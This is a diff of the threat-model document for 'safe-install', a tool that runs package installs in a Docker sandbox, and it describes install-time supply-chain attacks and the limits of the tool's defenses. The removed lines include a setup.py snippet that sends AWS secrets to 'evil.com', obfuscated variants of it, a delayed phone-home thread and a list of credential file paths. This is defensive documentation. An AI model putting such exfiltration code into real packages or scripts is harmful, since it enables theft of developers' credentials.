@@ -1,185 +1,163 @@
 # Threat Model
 
+This document describes the threats that safe-install addresses, the mechanisms it uses, and the limitations of each mechanism. It is written to be precise rather than persuasive.
+
+## Scope
+
+safe-install focuses on **install-time** threats in package manager ecosystems. Specifically, it targets the window of time between when you run an install command and when the package is available for import/use.
+
+safe-install does NOT claim to provide comprehensive protection against all supply chain attacks. It reduces exposure in one phase (install-time) and provides heuristic detection in others.
+
 ## Attack Surface: Package Installation
 
-When you run `pip install X`, the following happens:
+When you run `pip install X`:
 
 1. pip resolves the dependency tree (X + all transitive deps)
 2. For each package, pip downloads from PyPI
-3. If the package is a source distribution (sdist), pip runs `setup.py` or the build backend
-4. The build script has **full access** to your user account
+3. If the package is a source distribution (sdist), pip runs `setup.py` or the PEP 517 build backend
+4. The build script runs with **full user permissions**
 
-### What a malicious setup.py can access
+Step 3 is the critical attack window. The build script can read any file, access any environment variable, open network connections, and execute arbitrary commands as your user. This applies identically across ecosystems: npm has preinstall/postinstall scripts, cargo has build.rs, gem has extconf.rb.
 
-| Asset | Path/Method | Impact |
-|-------|------------|--------|
-| SSH keys | `~/.ssh/id_*` | Access to all servers, GitHub, GitLab |
-| AWS credentials | `~/.aws/credentials`, `AWS_SECRET_ACCESS_KEY` | Full cloud account access |
-| GCP credentials | `~/.config/gcloud/`, `GOOGLE_APPLICATION_CREDENTIALS` | Full cloud account access |
-| Azure credentials | `~/.azure/`, `AZURE_CLIENT_SECRET` | Full cloud account access |
-| Kubernetes config | `~/.kube/config` | Cluster admin access |
-| Git credentials | `~/.git-credentials`, `GITHUB_TOKEN` | Push to any repo |
-| Browser passwords | Chrome Login Data, Firefox profiles | All saved passwords |
-| API keys | `os.environ` (all env vars) | OpenAI, Stripe, Slack, etc. |
-| Shell history | `~/.bash_history`, `~/.zsh_history` | Commands, passwords in cleartext |
-| Crypto wallets | `~/.bitcoin/`, `~/.ethereum/`, `~/.solana/` | Direct theft |
-| Docker auth | `~/.docker/config.json` | Push to registries |
-| PyPI/npm tokens | `~/.pypirc`, `~/.npmrc` | Publish malicious packages (contagion) |
-| SSL certificates | `*.pem`, `*.key` | Man-in-the-middle attacks |
-| Database passwords | `DATABASE_URL`, `DB_PASSWORD` | Full database access |
-| CI/CD tokens | `CIRCLE_TOKEN`, `CI_JOB_TOKEN` | Pipeline compromise |
+## What safe-install Reduces
 
-### Attack timing
+### Install-time credential exposure (Docker sandbox)
 
-```
-pip install pkg
-       |
-       v
-  Resolve deps -----> Dependency confusion attack
-       |               (private package name hijacked on public PyPI)
-       v
-  Download ---------> Package tampering
-       |               (compromised maintainer, stolen credentials)
-       v
-  Build (setup.py) -> CODE EXECUTION (this is where exfiltration happens)
-       |
-       v
-  Install to site-packages
-       |
-       v
-  import pkg -------> SECOND CODE EXECUTION (init functions, import hooks)
-```
+**Mechanism**: Package download and build happen inside a Docker container with:
+- No volume mounts (no access to host filesystem)
+- No environment variables from the host
+- `--cap-drop=ALL` (no Linux capabilities)
+- `--read-only` root filesystem
+- `--security-opt=no-new-privileges`
+- Memory and CPU limits
+- Restricted DNS (`--dns 1.1.1.1`)
 
-## Real-World Attacks
+**What this achieves**: Malicious code in setup.py/postinstall/build.rs executes inside the container where there is nothing to steal. SSH keys, cloud credentials, API tokens, browser data, and environment variables are not accessible.
 
-### pip ecosystem
+**Residual risks**:
+- Container escape exploits (mitigated by capability dropping, but not impossible)
+- DNS-based data exfiltration from within the container (the container can make DNS queries)
+- Network-based exfiltration to arbitrary hosts (the container has network access for package downloads)
+- Resource exhaustion despite limits (the container can still consume its allocated memory/CPU)
+- Side-channel attacks (timing, cache-based) are not addressed
 
-| Attack | Year | Impact | Method |
-|--------|------|--------|--------|
-| **litellm 1.82.8** | 2025 | 97M downloads/month, exfiltrated SSH keys, cloud creds, crypto wallets, shell history | Compromised maintainer credentials, malicious setup.py |
-| **ultralytics** | 2024 | Cryptominer injected via compromised GitHub Actions | CI/CD pipeline compromise |
-| **pytorch-nightly** | 2022 | Dependency confusion attack on `torchtriton` | Private package name registered on PyPI |
-| **ctx** | 2022 | Stole env vars, sent to attacker server | Maintainer account takeover |
-| **colourama** | 2023 | Typosquat of `colorama`, credential theft | Name similarity |
+**Confidence**: High. This is the strongest defense layer. It does not depend on detecting malicious behavior.
 
-### npm ecosystem
+### Install-time credential exposure (Credential vault fallback)
 
-| Attack | Year | Impact | Method |
-|--------|------|--------|--------|
-| **event-stream** | 2018 | Backdoor targeting Copay Bitcoin wallet | Social engineering (new maintainer gained trust, then injected payload) |
-| **ua-parser-js** | 2021 | Cryptominer + password stealer, 7M weekly downloads | Compromised maintainer NPM account |
-| **colors / faker** | 2022 | Infinite loop, broke thousands of projects | Maintainer protest/sabotage |
-| **node-ipc** | 2022 | Wiped files on Russian/Belarusian IPs | Maintainer protestware |
-| **@solana/web3.js** | 2024 | Credential stealer in official Solana SDK | Compromised publish access |
+**Mechanism**: When Docker is unavailable, safe-install temporarily moves sensitive files (SSH keys, cloud configs, etc.) to a temporary directory and clears sensitive environment variables. After install, everything is restored.
 
-### Other ecosystems
+**What this achieves**: Reduces the set of credentials accessible to malicious build scripts.
 
-| Attack | Ecosystem | Year | Method |
-|--------|-----------|------|--------|
-| **rustdecimal** | Cargo | 2022 | Typosquat, stole env vars via build.rs |
-| **rest-client** | Gem | 2019 | Backdoor via compromised maintainer account |
-| **Codecov** | Docker/CI | 2021 | Modified bash uploader script, stole CI credentials |
+**Residual risks**:
+- The vault temp directory is discoverable by an attacker who knows about safe-install
+- `/proc/self/environ` on Linux still shows the parent process environment
+- Not all credential locations are known; custom or application-specific credentials may be missed
+- Browser credential stores may not be movable while the browser is running
+- Race conditions between vault lock/unlock and malicious code execution
+- An attacker who detects the vault mechanism could wait for unlock
 
-## Contagion Effect
+**Confidence**: Moderate. This is a meaningful speed bump, not a wall.
 
-The most terrifying aspect: **the attack spreads through dependency trees**.
+## What safe-install Detects Heuristically
 
-```
-Attacker compromises litellm (97M downloads/month)
-    |
-    +--> dspy depends on litellm >= 1.64.0
-    |       +--> pip install dspy pulls in poisoned litellm
-    |
-    +--> any-mcp-plugin depends on litellm
-    |       +--> Cursor/VSCode users get pwned
-    |
-    +--> company-internal-tool depends on litellm
-            +--> entire engineering org compromised
-            +--> stolen credentials used to:
-                    +--> push malicious code to company repos
-                    +--> access cloud infrastructure
-                    +--> compromise more packages
-                    +--> lateral movement across organization
-```
+### Suspicious source patterns
 
-Stolen PyPI/npm tokens enable the attacker to compromise MORE packages, creating a cascading chain reaction.
+**Mechanism**: Regex-based pattern matching across package source code, with elevated severity for high-risk files (setup.py, postinstall.js, build.rs).
 
-## Attack Sophistication Levels
+**What this detects**: Direct, unobfuscated use of HTTP libraries, subprocess execution, environment variable access, sensitive file reads, base64 encoding, socket creation, and dynamic code execution in build/install scripts.
 
-### Level 1: Obvious (caught by source inspection)
-```python
-# setup.py
-import os, urllib.request
-data = os.environ.get('AWS_SECRET_ACCESS_KEY')
-urllib.request.urlopen(f'https://evil.com/steal?d={data}')
-```
+**What this misses**:
+- Any form of obfuscation (base64-wrapped code, byte arrays, encrypted payloads)
+- Multi-stage loaders where the initial payload is benign
+- Compiled native code with embedded malicious behavior
+- Legitimate packages that use these patterns (false positives, mitigated by co-occurrence analysis and whitelisting)
 
-### Level 2: Slightly obfuscated (sometimes caught)
-```python
-# setup.py
-import base64, importlib
-mod = importlib.import_module(base64.b64decode('dXJsbGli').decode())
-getattr(mod, base64.b64decode('cmVxdWVzdA==').decode()).urlopen(...)
-```
+**Confidence**: Low to moderate. Useful as an early warning system. Not reliable as a primary defense.
 
-### Level 3: Heavily obfuscated (unlikely caught by inspection)
-```python
-# setup.py
-exec(bytes([105,109,112,111,114,116,32,111,115]).decode())
-```
+### Typosquatting
 
-### Level 4: Time-delayed / conditional (not caught by inspection)
-```python
-# __init__.py (runs on import, not install)
-import threading, time
-def _phone_home():
-    time.sleep(3600)  # wait 1 hour
-    # ... exfiltrate
-threading.Thread(target=_phone_home, daemon=True).start()
-```
+**Mechanism**: Edit-distance comparison of the requested package name against a list of popular packages.
 
-### Level 5: Native code (not inspectable)
-```c
-// Compiled into the .so/.dll that's included in the wheel
-// Binary analysis required to detect
-```
+**What this detects**: Simple misspellings and character substitutions (e.g., `reqeusts` vs `requests`).
 
-**safe-install's Docker sandbox stops ALL 5 levels** because the malicious code has nothing to access, regardless of how sophisticated it is.
+**What this misses**:
+- Homoglyph attacks (visually similar Unicode characters) despite config claiming support
+- Packages with legitimately similar names
+- Novel typosquats against packages not in the popular list
+- Name confusion across ecosystems
 
-## Threat Matrix vs. Defense Layers
+**Confidence**: Moderate for common cases. The accuracy claim has not been validated against an adversarial corpus.
 
-| Attack | Docker Sandbox | Binary-Only | Hash Lock | Vault | Source Scan | Net Monitor |
-|--------|:---:|:---:|:---:|:---:|:---:|:---:|
-| Credential theft in setup.py | BLOCKED | BLOCKED | - | BLOCKED | DETECTED | DETECTED |
-| Credential theft in __init__.py | - | - | - | - | DETECTED | DETECTED |
-| Dependency confusion | - | - | BLOCKED | - | - | - |
-| Typosquatting | - | - | BLOCKED | - | DETECTED | - |
-| Compromised maintainer | BLOCKED | BLOCKED* | BLOCKED | BLOCKED | MAYBE | DETECTED |
-| Cryptominer in install | BLOCKED | BLOCKED | - | - | DETECTED | DETECTED |
-| RAM bomb / DoS | BLOCKED (--memory=2g) | - | - | - | - | - |
-| DNS exfiltration | PARTIAL (--dns restricted) | - | - | - | DETECTED | - |
-| Time-delayed payload | - | - | - | - | - | DETECTED |
-| Compiled malicious code | BLOCKED | - | BLOCKED | BLOCKED | - | DETECTED |
+### Package metadata anomalies
 
-`*` Binary-only blocks setup.py execution but the wheel itself could still contain malicious __init__.py
+**Mechanism**: Queries PyPI/npm registry APIs for package age, maintainer history, download counts, and recent version changes.
 
-## Residual Risks
+**What this detects**: Very new packages, recent maintainer changes, packages with suspiciously low download counts.
 
-Even with all defenses active, these risks remain:
+**What this misses**:
+- Compromised packages with long legitimate histories (the litellm case)
+- Attacks via legitimate maintainer accounts
+- Sophisticated social engineering where attackers build trust over time
 
-1. **Import-time execution**: Code runs when you `import pkg` in your real environment
-2. **Compiled binaries in wheels**: Native code can do anything
-3. **Build tool compromise**: If pip/npm/cargo themselves are compromised
-4. **OS-level attacks**: Kernel exploits from within Docker container (extremely unlikely with --cap-drop=ALL)
-5. **Registry infrastructure**: If PyPI/npm registry itself is compromised
+**Confidence**: Low to moderate. Useful as one signal among many.
+
+## What Remains Possible Despite safe-install
+
+These threats are NOT addressed or only partially addressed:
+
+### Import-time code execution
+
+When you `import pkg` in your real environment, the package's `__init__.py` and all imported modules execute with full user permissions. The Docker sandbox protects install-time only.
+
+The `safe-install guard` command provides an experimental import hook for interactive Python sessions, but this does not protect production code.
+
+### Native extensions in wheels
+
+Pre-built wheels (`.whl`) can contain compiled shared libraries (`.so`, `.dll`) that execute arbitrary code when loaded. Source inspection cannot analyze compiled code. Binary analysis is a stub.
+
+### Time-delayed payloads
+
+Malicious code can wait (hours, days) before activating. A clean install-time scan says nothing about future behavior.
+
+### Build tool compromise
+
+If pip, npm, or cargo themselves are compromised, safe-install (which invokes these tools) cannot detect the compromise.
+
+### Registry infrastructure attacks
+
+If PyPI or npm registry infrastructure is compromised at the server level, packages could be silently replaced. Hash verification helps only if you have a trusted prior hash.
+
+### Dependency confusion / namespace attacks
+
+safe-install has a `DependencyConfusionDetector` module but it is not deeply integrated. It checks for packages that might be internal names registered on public registries, but this requires knowing your internal package names.
+
+## Threat Matrix
+
+| Attack Vector | Docker Sandbox | Vault | Source Scan | Network Monitor | Typosquat |
+|--------------|:-:|:-:|:-:|:-:|:-:|
+| Credential theft in setup.py | **Blocked** | **Reduced** | Detected* | Detected* | - |
+| Credential theft in __init__.py | - | - | Detected* | - | - |
+| Dependency confusion | - | - | - | - | - |
+| Typosquatting | - | - | - | - | **Detected** |
+| Compromised maintainer | **Blocked** (install-time) | **Reduced** | Maybe | Detected* | - |
+| Cryptominer in install | **Blocked** (resource limited) | - | Detected* | Detected* | - |
+| RAM/CPU bomb | **Limited** | - | - | - | - |
+| DNS exfiltration | Partial | - | - | - | - |
+| Time-delayed payload | - | - | - | - | - |
+| Native code in wheel | **Blocked** (install-time only) | **Reduced** | - | Detected* | - |
+
+`*` Detection is heuristic and bypassable. "Detected" means "may be detected in non-obfuscated cases."
+
+`**Blocked**` at install-time means the malicious code runs in the sandbox where it cannot access host resources. It does NOT mean the package is safe to import afterward.
 
 ## Recommendations
 
-1. **Install Docker** — it's the only flawless defense layer
-2. **Use lockfiles with hashes** — detect any package tampering
-3. **Prefer binary-only installs** — no code executes during install
-4. **Minimize dependencies** — fewer deps = smaller attack surface
-5. **Use virtual environments** — limit blast radius of import-time attacks
-6. **Audit before install** — `safe-install audit pkg` before `safe-install install pkg`
-7. **Pin exact versions** — prevent silent upgrades to compromised versions
-8. **Monitor for credential leaks** — rotate keys if any install seems suspicious
+1. **Use Docker**: It is the only defense layer that does not depend on pattern matching or behavioral detection.
+2. **Prefer binary-only installs** for pip (`--binary-only`): wheels do not execute setup.py.
+3. **Use virtual environments**: Limit the blast radius of import-time attacks.
+4. **Minimize dependencies**: Fewer deps = smaller attack surface.
+5. **Pin exact versions with hashes**: Prevents silent upgrades to compromised versions.
+6. **Audit before install**: `safe-install audit pkg --deep` before `safe-install install pkg`.
+7. **Monitor for credential leaks**: Rotate keys if any install seems suspicious.
+8. **Do not rely solely on safe-install**: It is one layer in your security posture, not a complete solution.
